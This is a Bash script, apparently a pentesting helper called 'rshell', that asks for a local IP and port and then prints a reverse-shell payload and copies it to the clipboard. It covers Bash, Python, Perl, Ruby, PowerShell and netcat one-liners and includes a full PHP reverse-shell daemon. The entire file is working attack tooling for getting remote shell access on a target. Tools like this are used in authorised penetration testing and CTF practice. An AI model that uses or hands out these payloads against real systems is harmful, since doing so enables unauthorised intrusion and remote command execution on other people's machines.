#!/bin/bash


#Colores
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"


function interface(){

lineas=$(ifconfig| grep "inet" | cut -d " " -f10 | grep -Ev "[:a-zA-Z]" | grep -v 127 | wc -l) #numero de interfaces

int=$(ifconfig| grep "inet" | cut -d " " -f10 | grep -Ev "[:a-zA-Z]" | grep -v 127) #interfaz

cont=1

a=$(echo "$int")

c=$(while [ "$cont" -le "$lineas" ]; do
	for i in $(echo "$a"); do
	echo  "$cont)" $i
	let cont=$cont+1
	done
done)

echo "$c" | cut -d " " -f1,2

read -p "Select an option: " ip

ip=$(echo "$c" | grep "$ip)" | cut -d " " -f 2)

read -p "Port: " port

}

########### Lenguajes #########

function bash() {

echo ""
echo -e "                          ${redColour}BASH ${endColour}"
interface
echo -e "${yellowColour}bash -c \"bash -i >& /dev/tcp/$ip/$port 0>&1\" ${normalColour}"
echo "bash -c \"bash -i >& /dev/tcp/$ip/$port 0>&1\"" | xclip -sel clip

echo -e "${greenColour}Rev-Shell copied to clipboard ${normalColour}"
exit 0
}


function python(){

echo ""
echo -e "                           ${redColour}PYTHON ${endColour}"
interface
echo -e "${yellowColour}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\","-i"]);'${endColour}"
echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" | xclip -sel clip

echo -e "${greenColour}Rev-Shell copied to clipboard ${normalColour}"
exit 0
}

function php(){


echo ""
echo -e "                         ${redColour}PHP ${endColour}"
interface

echo -e "${yellowColour}"

echo "<?php
set_time_limit (0);
\$VERSION = \"1.0\";
\$ip_php = \"$ip\";
\$port_php = \"$port\";
\$chunk_size = 1400;
\$write_a = null;
\$error_a = null;
\$shell = 'uname -a; w; id; /bin/sh -i';
\$daemon = 0;
\$debug = 0;

if (function_exists('pcntl_fork')) {
	\$pid = pcntl_fork();

	if (\$pid == -1) {
		printit(\"ERROR: Can't fork\");
		exit(1);
	}

	if (\$pid) {
		exit(0);  // Parent exits
	}

	if (posix_setsid() == -1) {
		printit(\"Error: Can't setsid()\");
		exit(1);
	}

	\$daemon = 1;
} else {
	printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");
}

chdir(\"/\");

umask(0);

\$sock = fsockopen(\$ip_php, \$port_php, \$errno, \$errstr, 30);
if (!\$sock) {
	printit(\"$errstr (\$errno)\");
	exit(1);
}

\$descriptorspec = array(
   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from
   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to
   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to
);

\$process = proc_open(\$shell, \$descriptorspec, \$pipes);

if (!is_resource(\$process)) {
	printit(\"ERROR: Can't spawn shell\");
	exit(1);
}

stream_set_blocking(\$pipes[0], 0);
stream_set_blocking(\$pipes[1], 0);
stream_set_blocking(\$pipes[2], 0);
stream_set_blocking(\$sock, 0);

printit(\"Successfully opened reverse shell to \$ip:\$port\");

while (1) {
	if (feof(\$sock)) {
		printit(\"ERROR: Shell connection terminated\");
		break;
	}

	if (feof(\$pipes[1])) {
		printit(\"ERROR: Shell process terminated\");
		break;
	}

	\$read_a = array(\$sock, \$pipes[1], \$pipes[2]);
	\$num_changed_sockets = stream_select(\$read_a, \$write_a, \$error_a, null);

	if (in_array(\$sock, \$read_a)) {
		if (\$debug) printit(\"SOCK READv\");
		\$input = fread(\$sock, \$chunk_size);
		if (\$debug) printit(\"SOCK: \$input\");
		fwrite(\$pipes[0], \$input);
	}

	if (in_array(\$pipes[1], \$read_a)) {
		if (\$debug) printit(\"STDOUT READ\");
		\$input = fread(\$pipes[1], \$chunk_size);
		if (\$debug) printit(\"STDOUT: \$input\");
		fwrite(\$sock, \$input);
	}

	if (in_array(\$pipes[2], \$read_a)) {
		if (\$debug) printit(\"STDERR READ\");
		\$input = fread(\$pipes[2], \$chunk_size);
		if (\$debug) printit(\"STDERR: \$input\");
		fwrite(\$sock, \$input);
	}
}

fclose(\$sock);
fclose(\$pipes[0]);
fclose(\$pipes[1]);
fclose(\$pipes[2]);
proc_close(\$process);

function printit (\$string) {
	if (!\$daemon) {
		print \"\$string\n\";
	}
}

?>"

echo -e "${endColour}"


echo "<?php
set_time_limit (0);
\$VERSION = \"1.0\";
\$ip_php = \"$ip\";
\$port_php = \"$port\";
\$chunk_size = 1400;
\$write_a = null;
\$error_a = null;
\$shell = 'uname -a; w; id; /bin/sh -i';
\$daemon = 0;
\$debug = 0;

if (function_exists('pcntl_fork')) {
	\$pid = pcntl_fork();

	if (\$pid == -1) {
		printit(\"ERROR: Can't fork\");
		exit(1);
	}

	if (\$pid) {
		exit(0);  // Parent exits
	}

	if (posix_setsid() == -1) {
		printit(\"Error: Can't setsid()\");
		exit(1);
	}

	\$daemon = 1;
} else {
	printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");
}

chdir(\"/\");

umask(0);

\$sock = fsockopen(\$ip_php, \$port_php, \$errno, \$errstr, 30);
if (!\$sock) {
	printit(\"$errstr (\$errno)\");
	exit(1);
}

\$descriptorspec = array(
   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from
   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to
   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to
);

\$process = proc_open(\$shell, \$descriptorspec, \$pipes);

if (!is_resource(\$process)) {
	printit(\"ERROR: Can't spawn shell\");
	exit(1);
}

stream_set_blocking(\$pipes[0], 0);
stream_set_blocking(\$pipes[1], 0);
stream_set_blocking(\$pipes[2], 0);
stream_set_blocking(\$sock, 0);

printit(\"Successfully opened reverse shell to \$ip:\$port\");

while (1) {
	if (feof(\$sock)) {
		printit(\"ERROR: Shell connection terminated\");
		break;
	}

	if (feof(\$pipes[1])) {
		printit(\"ERROR: Shell process terminated\");
		break;
	}

	\$read_a = array(\$sock, \$pipes[1], \$pipes[2]);
	\$num_changed_sockets = stream_select(\$read_a, \$write_a, \$error_a, null);

	if (in_array(\$sock, \$read_a)) {
		if (\$debug) printit(\"SOCK READv\");
		\$input = fread(\$sock, \$chunk_size);
		if (\$debug) printit(\"SOCK: \$input\");
		fwrite(\$pipes[0], \$input);
	}

	if (in_array(\$pipes[1], \$read_a)) {
		if (\$debug) printit(\"STDOUT READ\");
		\$input = fread(\$pipes[1], \$chunk_size);
		if (\$debug) printit(\"STDOUT: \$input\");
		fwrite(\$sock, \$input);
	}

	if (in_array(\$pipes[2], \$read_a)) {
		if (\$debug) printit(\"STDERR READ\");
		\$input = fread(\$pipes[2], \$chunk_size);
		if (\$debug) printit(\"STDERR: \$input\");
		fwrite(\$sock, \$input);
	}
}

fclose(\$sock);
fclose(\$pipes[0]);
fclose(\$pipes[1]);
fclose(\$pipes[2]);
proc_close(\$process);

function printit (\$string) {
	if (!\$daemon) {
		print \"\$string\n\";
	}
}

?>" | xclip -sel clip

echo -e "${greenColour}Rev-Shell copied to clipboard ${normalColour}"
exit 0
}

function perl(){
echo ""
echo -e "                          ${redColour}PERL ${endColour}"
interface
echo -e "${yellowColour}perl -e 'use Socket;\$i=\"$ip\";\$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"\/bin\/sh -i\");};'${normalColour}"
echo  "perl -e 'use Socket;\$i=\"$ip\";\$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"\/bin\/sh -i\");};'" | xclip -sel clip

echo -e "${greenColour}Rev-Shell copied to clipboard ${normalColour}"
exit 0
}

function powershell(){
echo ""
echo -e "                         ${redColour}POWERSHELL ${endColour}"
interface
echo -e "${yellowColour}"powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"${endColour}
echo powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" | xclip -sel clip
echo -e "${greenColour}Rev-Shell copied to clipboard ${normalColour}"
exit 0
}

function ruby(){


echo ""
echo -e "                         ${redColour}RUBY ${endColour}"
interface

echo -e "${yellowColour}ruby -rsocket -e'f=TCPSocket.open("$ip",$port).to_i;exec sprintf("/bin/sh -i \<\&\%d \>\&\%d 2\>\&\%d",f,f,f)'${endColour}"
echo "ruby -rsocket -e'f=TCPSocket.open("$ip",$port).to_i;exec sprintf("/bin/sh -i \<\&\%d \>\&\%d 2\>\&\%d",f,f,f)'" | xclip -sel clip

echo -e "${greenColour}Rev-Shell copied to clipboard ${normalColour}"
exit 0
}


function netcat(){
echo ""
echo -e "                         ${redColour}NETCAT ${endColour}"
interface
echo -e "${yellowColour}nc -e /bin/bash $ip $port${endColour}"
echo "nc -e /bin/bash $ip $port" | xclip -sel clip

echo -e "${greenColour}Rev-Shell copied to clipboard ${normalColour}"
exit 0
}

function init(){

echo "Usage: rshell <language>"
echo ""
echo -e "${turquoiseColour}Languages:${endColour} "
echo "Bash"
echo "Python"
echo "Php"
echo "Perl"
echo "Powershell"
echo "Netcat"
echo "Ruby"
exit 0

}

######## Main ########

if [[ $# -eq 0 || "$1" == "-h" ]]; then

	init

fi


arg=$(echo "$1" |tr '[:upper:]' '[:lower:]')


if [ "$arg" == "bash" ]; then

	bash

fi


if [ "$arg" == "python" ]; then

	python

fi


if [ "$arg" == "php" ]; then

	php

fi

if [ "$arg" == "perl" ]; then

	perl

fi

if [ "$arg" == "ruby" ]; then

	ruby

fi

if [ "$arg" == "netcat" ]; then

	netcat

fi

if [ "$arg" == "powershell" ]; then

	powershell

fi
##### Dot #####
